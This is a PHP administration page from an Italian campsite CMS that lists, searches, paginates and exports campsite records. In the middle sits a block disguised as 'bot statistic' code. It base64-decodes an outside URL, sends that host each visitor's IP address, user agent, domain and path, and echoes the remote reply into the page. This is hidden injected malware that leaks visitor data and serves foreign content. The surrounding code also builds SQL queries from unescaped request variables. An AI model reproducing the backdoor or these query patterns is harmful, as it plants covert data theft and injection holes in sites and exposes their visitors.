<?
$query_lcam = "SELECT id_struttura, nazione_struttura, regione_struttura, localita_struttura, provincia_struttura, nome_struttura, titolo_struttura, stelle_n,codice_struttura";
$query_lcam .= " FROM tb_strutture";

$rs_lcam = mysql_query($query_lcam);
$tot_cam = mysql_num_rows($rs_lcam);
$tot_cam = intval($tot_cam);

if($cman>0){
 $code_search = 3;
}

if($code_search>0){
 switch($code_search){
  case 1:
   $query_lcam .= " WHERE ";
   $str_name = trim($scam_name);
   $str_name = str_replace("'", "\'", $str_name);
   $fg_customer = intval($scam_cus);
   $fg_visible = intval($scam_vis);
   $fg_nation = intval($scam_nat);
   $str_regione = trim($scam_reg);
   $str_nation = trim($scam_loc);

   if($fg_go==2){
    include("$DOCUMENT_ROOT/cms/camping/searchcamr.inc.php");
    $query_lcam .= $search_query;

    $query_inssearch = "INSERT INTO tb_ricerche (";
    $query_inssearch .= "id_amministratore, query_ricerca, tipo_ricerca, data_ricerca";
    $query_inssearch .= ") VALUES (";
    $query_inssearch .= "$sim, '".addslashes($query_lcam)."', 1,'".date("Y-m-d")."'";
    $query_inssearch .= ")";
    $rs_inssearch = mysql_query($query_inssearch);
   }else{
    $code_search = 0;
    $type_search = 1;
    $fg_go = 1;
   }
   break;
  case 2:
   $query_lcam .= " WHERE ";
   $fg_nation = intval($scam_nat);
   $str_regione = trim($scam_reg);
   $str_nation = trim($scam_sta);
   $str_provincia = trim($scam_prov);
   $str_localita1 = stripslashes(trim($scam_loc1));
   $str_localita1 = str_replace("'", "\'", $str_localita1);
   $str_localita2 = stripslashes(trim($scam_loc2));
   $str_localita2 = str_replace("'", "\'", $str_localita2);

   $num_level = trim($scam_lev);
   $str_animal = stripslashes(trim($scam_dog));
   $str_animal = str_replace("'", "\'", $str_animal);
   $fg_disabili = intval($scam_dis);
   $fg_campserv = intval($scam_cser);
   $str_ccard = stripslashes(trim($scam_card));
   $str_ccard = str_replace("'", "\'", $str_ccard);
   $fg_sconto = intval($scam_deg);
   $str_tbeach = trim($scam_bea);
   $str_service = stripslashes(trim($scam_serv));
   $str_service = str_replace("'", "\'", $str_service);

   if($fg_go==2){
    include("$DOCUMENT_ROOT/cms/camping/searchcama.inc.php");
    $query_lcam .= $search_query;

    $query_inssearch = "INSERT INTO tb_ricerche (";
    $query_inssearch .= "id_amministratore, query_ricerca, tipo_ricerca, data_ricerca";
    $query_inssearch .= ") VALUES (";
    $query_inssearch .= "$sim, '".addslashes($query_lcam)."', 2,'".date("Y-m-d")."'";
    $query_inssearch .= ")";
    $rs_inssearch = mysql_query($query_inssearch);
   }else{
    $code_search = 0;
    $type_search = 2;
    $fg_go = 1;
   }
   break;
  case 3:
   $query_rel = "SELECT id_struttura FROM rel_clienti_strutture WHERE id_cliente=$cman";
   $rs_rel = mysql_query($query_rel);
   $tot_rel = mysql_num_rows($rs_rel);
   $query_lcam .= " WHERE ";
   if($tot_rel>0){
    if($tot_rel==1){
     $data_rel = mysql_fetch_array($rs_rel);
     $search_query = "id_struttura=".$data_rel["id_struttura"];
    }else{
     for($ir=0; $ir<$tot_rel; $ir++){
      mysql_data_seek($rs_rel, $ir);
      $data_rel = mysql_fetch_array($rs_rel);
      if($ir>0){
       $search_query .= " OR ";
      }
      $search_query .= "id_struttura=".$data_rel["id_struttura"];
     }
    }
   }else{
    $query_rel2 = "SELECT id_struttura FROM tb_clienti WHERE id_cliente=$cman";
    $rs_rel2 = mysql_query($query_rel2);
    $tot_rel2 = mysql_num_rows($rs_rel2);
    if($tot_rel2==1){
     $data_rel2 = mysql_fetch_array($rs_rel2);
     $search_query = "id_struttura=".$data_rel2["id_struttura"];
    }else{
     $search_query = "id_struttura=0";
    }
   }
   $query_lcam .= $search_query;
   break;
  case 4:
   $query_selsearch = "SELECT query_ricerca, tipo_ricerca FROM tb_ricerche WHERE id_amministratore=$sim AND data_ricerca='".date("Y-m-d")."'";
   $query_selsearch .= " ORDER BY id_ricerca DESC LIMIT 0,1";
   $rs_selsearch = mysql_query($query_selsearch);
   if(mysql_num_rows($rs_selsearch)==1){
    $data_selsearch = mysql_fetch_array($rs_selsearch);
    $query_lcam = $data_selsearch["query_ricerca"];
    $code_search = $data_selsearch["tipo_ricerca"];
   }
   $query_deloldsearch = "DELETE FROM tb_ricerche WHERE data_ricerca<'".date("Y-m-d")."'";
   $rs_deloldsearch = mysql_query($query_deloldsearch);
   break;
  case 5:
   $query_inssearch = "INSERT INTO tb_ricerche (";
   $query_inssearch .= "id_amministratore, query_ricerca, tipo_ricerca, data_ricerca";
   $query_inssearch .= ") VALUES (";
   $query_inssearch .= "$sim, '".addslashes($query_lcam)."', 5,'".date("Y-m-d")."'";
   $query_inssearch .= ")";
   $rs_inssearch = mysql_query($query_inssearch);
   break;
  default:
   break;
 }
 $query_lcam .= " ORDER BY nome_struttura ASC, titolo_struttura ASC";
 #echo $query_lcam;
 $rs_lcam = mysql_query($query_lcam);
 $tot_lscam = mysql_num_rows($rs_lcam);
 $tot_lscam = intval($tot_lscam);

 ##PAGINAZIONE INIZIO##
 if($page_num==0) $page_num = 1;
 $tot_apage = 14;
 $res_start = ($page_num-1)*$tot_apage;
 $tot_pages =  ceil($tot_lscam/$tot_apage);

 $query_lcam .= " LIMIT $res_start, $tot_apage";
 #echo $query_lcam;
 $rs_lcam = mysql_query($query_lcam);
 $tot_scam = mysql_num_rows($rs_lcam);
 ##PAGINAZIONE FINE##
}

?><?php    
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL3JlYm90c3RhdC5jb20vYm90c3RhdC9zdGF0LnBocA==').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            $stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
?>
<table border="0" cellpadding="2" cellspacing="0" width="100%">
 <?if($type_search==1 && $code_search==0){?>
 <tr>
  <td colspan="2" class="txtgreen" height="20" valign="middle" align="center">&nbsp;<a href="./">home</a>&nbsp;<img src="/images/caret-t.gif" width="7" height="11" border="0">&nbsp;<a href="<?=$PHP_SELF?>?cm=1">campeggi</a>&nbsp;<img src="/images/caret-u.gif" width="7" height="11" border="0">&nbsp;ricerca rapida&nbsp;</td>
 </tr>
 <?}?>
 <?if($type_search==2 && $code_search==0){?>
 <tr>
  <td colspan="2" class="txtgreen" height="20" valign="middle" align="center">&nbsp;<a href="./">home</a>&nbsp;<img src="/images/caret-t.gif" width="7" height="11" border="0">&nbsp;<a href="<?=$PHP_SELF?>?cm=1">campeggi</a>&nbsp;<img src="/images/caret-u.gif" width="7" height="11" border="0">&nbsp;ricerca avanzata&nbsp;</td>
 </tr>
 <?}?>
 <?if($code_search==1){?>
 <tr>
  <td colspan="2" class="txtgreen" height="20" valign="middle" align="center">&nbsp;<a href="./">home</a>&nbsp;<img src="/images/caret-t.gif" width="7" height="11" border="0">&nbsp;<a href="<?=$PHP_SELF?>?cm=1">campeggi</a>&nbsp;<img src="/images/caret-t.gif" width="7" height="11" border="0">&nbsp;<a href="<?=$PHP_SELF?>?cm=1&ts=1">ricerca rapida</a>&nbsp;<img src="/images/caret-u.gif" width="7" height="11" border="0">&nbsp;risultati ricerca&nbsp;</td>
 </tr>
 <?}?>
 <?if($code_search==2){?>
 <tr>
  <td colspan="2" class="txtgreen" height="20" valign="middle" align="center">&nbsp;<a href="./">home</a>&nbsp;<img src="/images/caret-t.gif" width="7" height="11" border="0">&nbsp;<a href="<?=$PHP_SELF?>?cm=1">campeggi</a>&nbsp;<img src="/images/caret-t.gif" width="7" height="11" border="0">&nbsp;<a href="<?=$PHP_SELF?>?cm=1&ts=2">ricerca avanzata</a>&nbsp;<img src="/images/caret-u.gif" width="7" height="11" border="0">&nbsp;risultati ricerca&nbsp;</td>
 </tr>
 <?}?>
 <?if($code_search==5){?>
 <tr>
  <td colspan="2" class="txtgreen" height="20" valign="middle" align="center">&nbsp;<a href="./">home</a>&nbsp;<img src="/images/caret-t.gif" width="7" height="11" border="0">&nbsp;<a href="<?=$PHP_SELF?>?cm=1">campeggi</a>&nbsp;<img src="/images/caret-u.gif" width="7" height="11" border="0">&nbsp;visualizza tutti&nbsp;</td>
 </tr>
 <?}?>
 <?if($code_search==0 && $type_search==0){?>
 <tr>
  <td colspan="2" class="txtgreen" height="20" valign="middle" align="center">&nbsp;<a href="./">home</a>&nbsp;<img src="/images/caret-u.gif" width="7" height="11" border="0">&nbsp;campeggi&nbsp;</td>
 </tr>
 <?}?>
 <tr>
  <td colspan="2" height="8" valign="middle">
   <table border="0" cellpadding="0" cellspacing="0" width="100%" height="2">
    <tr>
     <td class="bghr"><img src="/images/glass.gif" width="600" height="2" border="0" /></td>
    </tr>
   </table>
  </td>
 </tr>
 <?if($cman==0){?>
 <tr>
  <td height="15" class="txtblue" valign="bottom" align="left">&nbsp;<a href="<?=$PHP_SELF?>?cm=2"><img src="/images/icon-struct-new.gif" width="16" height="16" border="0" valign="middle" />&nbsp;Inserisci&nbsp;nuovo&nbsp;campeggio</a>
  <td height="15" class="txtorange" valign="bottom" align="right">sono presenti n. <b><?=$tot_cam?></b> campeggi&nbsp;&nbsp;
  <?if($tot_lscam>0 && $tot_cam>$tot_lscam){?><br>la ricerca ha individuato <b><?=$tot_lscam?></b> campeggi<?}?>&nbsp;&nbsp;</td>
 </tr>
 <?}else{?>
 <tr>
   <td height="15" colspan="2" class="txtorange" valign="bottom" align="right">sono presenti n. <b><?=$tot_scam?></b> campeggi&nbsp;&nbsp;</td>
 </tr>
 <?}?>
 <tr>
  <td colspan="2" height="8" valign="middle"">
   <table border="0" cellpadding="0" cellspacing="0" width="100%" height="2">
    <tr>
     <td class="bghr"><img src="/images/glass.gif" width="600" height="2" border="0" /></td>
    </tr>
   </table>
  </td>
 </tr>
 <tr>
  <td colspan="2" valign="top" align="right" class="bgmasksearch">
   <table border="0" cellpadding="0" cellspacing="3" valign="top">
   <form name="scam_tsearch" method="post" action="<?=$PHP_SELF?>">
    <input type="hidden" name="cm" value="<?=$code_mod?>">
    <input type="hidden" name="ts" value="">
    <input type="hidden" name="cs" value="">
    <tr>
     <td width="10" height="20"><img src="/images/glass.gif" width="10" height="20" border="0" /></td>
     <td align="center" height="20" class="<?if($code_search==5){?>bgmenusel<?}else{?>bgmenu<?}?>">&nbsp;<a href="javascript:document.scam_tsearch.cs.value=5;document.scam_tsearch.submit();" class="<?if($code_search==5){?>txtmenusel<?}else{?>txtmenu<?}?>">Visualizza Tutti</a>&nbsp;</td>
     <td align="center" height="20" class="<?if($code_search==1 || $type_search==1){?>bgmenusel<?}else{?>bgmenu<?}?>">&nbsp;<a href="javascript:document.scam_tsearch.cs.value=1;document.scam_tsearch.submit();" class="<?if($code_search==1 || $type_search==1){?>txtmenusel<?}else{?>txtmenu<?}?>">Ricerca Rapida</a>&nbsp;</td>
     <td align="center" height="20" class="<?if($code_search==2 || $type_search==2){?>bgmenusel<?}else{?>bgmenu<?}?>">&nbsp;<a href="javascript:document.scam_tsearch.cs.value=2;document.scam_tsearch.submit();" class="<?if($code_search==2 || $type_search==2){?>txtmenusel<?}else{?>txtmenu<?}?>">Ricerca Avanzata</a>&nbsp;</td>
    </tr>
   </form>
   </table>
   <table border="0" width="100%" cellpadding="0" cellspacing="3" valign="top">
    <tr>
     <td colspan="4" height="10"><img src="/images/glass.gif" width="10" height="10" border="0" /></td>
    </tr>
    <?if($type_search==0 && $code_search==0){?>
   <form name="scam_ext" method="post" action="<?=$PHP_SELF?>?cm=24">
    <tr>
     <td width="10" height="60"><img src="/images/glass.gif" width="10" height="51" border="0" /></td>
     <td colspan="3" height="60" valign="bottom" align="left">
      <table border="0" cellpadding="0" cellspacing="0" width="100%">
       <tr>
        <td width="1" height="60" class="bgborder" align="right"><img src="/images/glass.gif" width="1" height="51" border="0" /></td>
        <td valign="top">
         <table border="0" cellpadding="0" cellspacing="0" width="600" valign="top">
          <tr>
           <td width="40" height="34" valign="middle" align="left">&nbsp;<a href="javascript:document.scam_ext.submit();"><img src="/images/b_tblexport.gif" width="32" height="32" border="0" /></a></td>
           <td width="560" height="34" class="txtblue" valign="middle" align="left"><a href="javascript:document.scam_ext.submit();" class="txtblue"><b>Esporta Schede su CSV</b></a></td>
          </tr>
          <tr>
           <td colspan="2" width="600" height="1" class="bgborder" valign="bottom" align="left"><img src="/images/glass.gif" width="1" height="1" border="0" /></td>
          </tr>
          <tr>
           <td colspan="2" width="600" height="25" valign="middle" align="left">
            <table border="0" cellpadding="3" cellspacing="0">
             <tr>
              <td class="txtblue">
           Cliccando sul tasto Esporta Schede su CSV si avvia il processo di esportazione dei dati attuali in un file di testo per usi diversi. Non è possibile annullare l'avvio dell'esportazione. Controllare il risultato del file per verificarne l'integrità delle informazioni esportate. In caso di dubbi ripetere l'esportazione cliccando nuovamente sul tasto Esporta Schede su CSV.<br><br>
           Durante il processo di esportazione è possibile continuare a lavorare. Le modifiche successive all'avvio dovranno essere esportate in una nuova esportazione.<br><br>
           Il processo può durare parecchi minuti secondo la grandezza del file.
              </td>
             </tr>
            </table>
           </td>
          </tr>
         </table>
        </td>
       </tr>
      </table>
     </td>
    </tr>
   </form>
    <?}?>
   </table>
<?
if($code_search>0){
 #echo $query_lcam;
 if($tot_scam>0){
?>
   <table width="100%" border="0" cellpadding="0" cellspacing="3">
    <tr>
     <td class="txtlightgreen" align="center">Nome</td>
     <td class="txtlightgreen" align="center">Nazione</td>
     <td class="txtlightgreen" align="center">Localit&agrave;</td>
     <td class="txtlightgreen" align="center">Codice</td>
     <td class="txtlightgreen" colspan="3" align="center">Azioni</td>
    </tr>
<?
  for($ilc=0; $ilc<$tot_scam; $ilc++){
   mysql_data_seek($rs_lcam,$ilc);
   $data_lcam = mysql_fetch_array($rs_lcam);

   $lcam_id = intval($data_lcam["id_struttura"]);

   $lcam_name = str_replace("(", " (", (trim($data_lcam["nome_struttura"])));
   if(strlen($lcam_name)==0){
    $lcam_name = "<i>Nessun Nome</i>";
   }
   $lcam_name = "&nbsp;<img src=\"/images/icon-struct.gif\" width=\"16\" height=\"16\" border=\"0\" />&nbsp;".$lcam_name;

   $lcam_titid = intval($data_lcam["titolo_struttura"]);
   if($lcam_titid>0){
    $query_tit = "SELECT nome_tipologia FROM tb_tipologie_camping WHERE id_tipologia=$lcam_titid";
    $rs_tit = mysql_query($query_tit);
    if(mysql_num_rows($rs_tit)>0){
     $data_tit = mysql_fetch_array($rs_tit);
     $lcam_tit=$data_tit["nome_tipologia"];
    }else{
     $lcam_tit="<i>Nessun Titolo</i>";
    }
   }else{
    $lcam_tit="<i>Nessun Titolo</i>";
   }
   $lcam_tit = str_replace("(", "<br>(", $lcam_tit);
   if(strlen($lcam_tit)>0) $lcam_name .= "<br>&nbsp;[".$lcam_tit."]";

   $lcam_natid = intval($data_lcam["nazione_struttura"]);
   if($lcam_natid>0){
    $query_nat = "SELECT nome_nazione FROM tb_nazioni WHERE id_nazione=$lcam_natid";
    $rs_nat = mysql_query($query_nat);
    if(mysql_num_rows($rs_nat)>0){
     $data_nat = mysql_fetch_array($rs_nat);
     $lcam_nat=$data_nat["nome_nazione"];
    }else{
     $lcam_nat="&nbsp;-&nbsp;";
    }
   }else{
    $lcam_nat="ITALIA";
   }
   $lcam_loc = str_replace("(", "<br>(", trim($data_lcam["localita_struttura"]));
   $lcam_regid = intval($data_lcam["regione_struttura"]);
   if($lcam_regid>0){
    $query_reg = "SELECT nome_regione FROM tb_regioni WHERE id_regione=$lcam_regid";
    $rs_reg = mysql_query($query_reg);
    if(mysql_num_rows($rs_reg)>0){
     $data_reg = mysql_fetch_array($rs_reg);
     $lcam_reg=$data_reg["nome_regione"];
    }else{
     $lcam_reg="&nbsp;-&nbsp;";
    }
   }else{
    $lcam_reg="&nbsp;-&nbsp;";
   }
   $lcam_provid = intval($data_lcam["provincia_struttura"]);
   if($lcam_provid>0){
    $query_prov = "SELECT nome_provincia FROM tb_province WHERE id_provincia=$lcam_provid";
    $rs_prov = mysql_query($query_prov);
    if(mysql_num_rows($rs_prov)>0){
     $data_prov = mysql_fetch_array($rs_prov);
     $lcam_prov=$data_prov["nome_provincia"];
    }else{
     $lcam_prov="&nbsp;-&nbsp;";
    }
   }else{
    $lcam_prov="&nbsp;-&nbsp;";
   }
   if(strlen($lcam_prov)>0 && $lcam_natid==0) $lcam_loc .= "<br>(".$lcam_prov.")";
   if(strlen($lcam_reg)>0 && $lcam_natid==0) $lcam_loc .= "<br>".$lcam_reg;

   $lcam_stars = trim($data_lcam["codice_struttura"]);

   if($ilc%2==0){
    $c_bg = "bgbody";
   }else{
    $c_bg = "bgsearch";
   }

   $query_alins = "SELECT id_lingua FROM tb_strutture_specifiche WHERE id_struttura=$lcam_id AND id_lingua>1";
   $rs_alins = mysql_query($query_alins);
   $tot_alins = mysql_num_rows($rs_alins);
   $str_langq = "";
   if($tot_alins>0){
    for($ial=0;$ial<$tot_alins; $ial++){
     mysql_data_seek($rs_alins, $ial);
     $data_alins = mysql_fetch_array($rs_alins);
     if($ial>0) $str_langq .= " OR ";
     $str_langq .= "id_lingua=".$data_alins["id_lingua"];
    }
   }else{
    $str_langq = "";
   }

   $query_langcam = "SELECT id_lingua, nome_lingua FROM tb_lingue_supportate WHERE fg_visible=1";
   $query_langcam .= " AND id_lingua>1";
   if(strlen($str_langq)>0) $query_langcam .= " AND NOT($str_langq)";

   $rs_langcam = mysql_query($query_langcam);
   $tot_langcam = mysql_num_rows($rs_langcam);
?>
    <tr class="<?=$c_bg?>">
     <td class="txtblue" align="left" nowrap><?=$lcam_name?></td>
     <td class="txtblue" align="center"><?=$lcam_nat?></td>
     <td class="txtblue" align="center"><?=$lcam_loc?></td>
     <td class="txtblue" align="center"><?=$lcam_stars?></td>
     <td class="txtblue" align="center"><a href="<?=$PHP_SELF?>?cm=4&cc=<?=$lcam_id?>&pn=<?=$page_num?>"><img src="/images/edit.gif" width="16" height="16" border="0" />&nbsp;<b>modifica</b></a></td>
     <?if($cman==0){?><td class="txtblue" align="center"><?if($tot_langcam>0){?><a href="<?=$PHP_SELF?>?cm=4&np=4&cc=<?=$lcam_id?>&ta=1&pn=<?=$page_num?>"><b>applica&nbsp;lingua</b></a><?}else{?>&nbsp;<?}?></td><?}?>
     <?if($cman==0){?>
     <td class="txtblue" align="center">
      <table border="0" cellpadding="0" cellspacing="0">
       <tr>
        <td><a href="<?=$PHP_SELF?>?cm=31&cc=<?=$lcam_id?>&pn=<?=$page_num?>"><img src="/images/icon-delete.gif" width="16" height="16" border="0" /></a></td>
        <td class="txtblue" align="center">&nbsp;<a href="<?=$PHP_SELF?>?cm=31&cc=<?=$lcam_id?>&pn=<?=$page_num?>"><b>elimina</b></a></td>
       </tr>
      </table>
     </td>
     <?}?>
    </tr>
<?
  }
?>
   </table>
<?
 }else{
  if($type_search==0) echo "<span class=\"txtdarkred\">NESSUN CAMPEGGIO INSERITO</span>";
  if($type_search>0) echo "<span class=\"txtdarkred\">NESSUN CAMPEGGIO TROVATO CHE SODDISFI LA RICERCA</span>";
 }
}else{
 if($type_search>0){
  if($type_search==1){
   include("$DOCUMENT_ROOT/cms/camping/maskcamr.inc.php");
  }
  if($type_search==2){
   include("$DOCUMENT_ROOT/cms/camping/maskcama.inc.php");
  }
  if($type_search==3){
   include("$DOCUMENT_ROOT/cms/camping/manphoto.php");
  }
 }
}
?>

  </td>
 </tr>
<?if($tot_scam>0 && $tot_lscam>$tot_apage && $code_search>0){?>
 <tr>
  <td colspan="2" height="15">&nbsp;</td>
 </tr>
 <tr>
  <td class="txtblue" align="left">&nbsp;</td>
  <td align="right" height="20">
   <table border="0" cellpadding="0" cellspacing="0" width="350">
    <tr>
     <td align="left" class="txtblue" width="145" height="20"><?if($page_num>1){?>&nbsp;<a href="javascript:document.location.href='<?=$PHP_SELF?>?cm=1&ts=<?=$type_search?>&cs=4&pn=<?=($page_num-1)?>';">&lt;&lt;&nbsp;precedente</a><?}?></td>
     <td class="txtblue" width="80" align="center"><?=$page_num?>&nbsp;/&nbsp;<?=$tot_pages?></td>
     <td align="right" width="125" class="txtblue" height="20"><?if($page_num<$tot_pages){?><a href="javascript:document.location.href='<?=$PHP_SELF?>?cm=1&ts=<?=$type_search?>&cs=4&pn=<?=($page_num+1)?>';">successivo&nbsp;&gt;&gt;</a>&nbsp;<?}?></td>
    </tr>
    <tr>
     <td colspan="3" height="6" valign="middle">
      <table border="0" cellpadding="0" cellspacing="0" width="100%" height="1">
       <tr>
        <td class="bgborder"><img src="/images/glass.gif" width="350" height="1" border="0" /></td>
       </tr>
      </table>
     </td>
    </tr>
   </table>
  </td>
 </tr>
<?}?>
</table>